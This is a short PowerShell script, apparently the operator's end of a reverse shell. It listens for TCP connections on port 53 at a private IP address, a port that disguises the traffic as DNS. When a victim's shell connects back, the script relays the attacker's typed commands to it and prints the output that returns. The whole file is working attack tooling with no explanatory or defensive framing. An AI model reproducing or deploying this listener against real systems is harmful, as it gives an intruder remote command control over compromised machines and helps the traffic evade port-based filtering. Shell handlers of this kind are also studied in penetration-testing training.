
$socket = new-object System.Net.Sockets.TcpListener('192.168.20.164', 53);

if($socket -eq $null){
	exit 1
}

$socket.start()
$client = $socket.AcceptTcpClient()
write-output "[*] Connection!"
$stream = $client.GetStream();
$writer = new-object System.IO.StreamWriter($stream);
$buffer = new-object System.Byte[] 2048;
$encoding = new-object System.Text.AsciiEncoding;

do
{
    $cmd = read-host
    $writer.WriteLine($cmd)
    $writer.Flush();
    if($cmd -eq "exit"){
        break
    }
		$read = $null;
		while($stream.DataAvailable -or $read -eq $null) {
			$read = $stream.Read($buffer, 0, 2048)
            $out = $encoding.GetString($buffer, 0, $read)
            Write-Output $out
		}

} While ($client.Connected -eq $true)

$socket.Stop()
$client.close();
$stream.Dispose()